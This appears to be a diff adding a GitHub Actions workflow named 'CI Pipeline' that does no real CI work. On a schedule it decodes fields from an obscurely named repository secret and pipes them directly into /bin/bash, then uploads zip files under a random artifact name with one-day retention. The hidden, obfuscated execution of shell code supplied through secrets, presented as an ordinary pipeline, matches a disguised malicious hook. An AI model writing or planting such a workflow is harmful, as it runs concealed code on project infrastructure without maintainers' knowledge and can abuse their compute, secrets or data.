@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          tftnw823: ${{ secrets.tftnw823 }}
+        run: |
+          printf '%s' "$tftnw823" | jq -r .pz32904 | /bin/bash
+          printf '%s' "$r09" | jq -r .g9810 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: cntn4cJ5
+          path: "*.zip"
+          retention-days: 1
